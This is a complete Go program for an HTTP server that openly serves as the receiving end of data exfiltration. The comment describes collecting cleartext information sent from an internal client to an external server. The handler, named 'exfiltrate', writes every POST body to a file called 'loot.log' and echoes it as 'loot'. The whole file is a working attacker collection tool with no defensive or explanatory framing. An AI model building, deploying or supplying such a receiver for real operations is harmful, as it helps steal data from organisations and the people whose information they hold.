package main

//
// post clear text http information from internal client
// to external server
//
import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

func postfile(s string) {

	f, err := os.OpenFile("loot.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Fatal(err)
	}
	nb, err := f.Write([]byte(s + "\n"))
	if err != nil {
		log.Fatal(err)
	}

	if err := f.Close(); err != nil {
		log.Fatal(err)
	}
	fmt.Printf("loot:%s bytes:%d\n", s, nb)
}

func exfiltrate(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	switch r.Method {
	case "GET":
		http.ServeFile(w, r, "form.html")
	case "POST":
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Fatal(err)
		}
		postfile(string(body))

		//
		// send back an ack
		//
		output, err := json.Marshal("ack")
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		w.Header().Set("content-type", "application/json")
		w.Write(output)

	default:
		fmt.Fprintf(w, "Sorry, only GET and POST methods are supported.")
	}
}

func main() {

	// expecting port
	portPtr := flag.String("port", "12970", "-port=\"8080\"")
	flag.Parse()
	//
	// lets define our handlers
	//
	http.HandleFunc("/", exfiltrate)
	s := ":" + *portPtr
	fmt.Printf("Starting server on port %s...\n", s)
	if err := http.ListenAndServe(s, nil); err != nil {
		log.Fatal(err)
	}
}
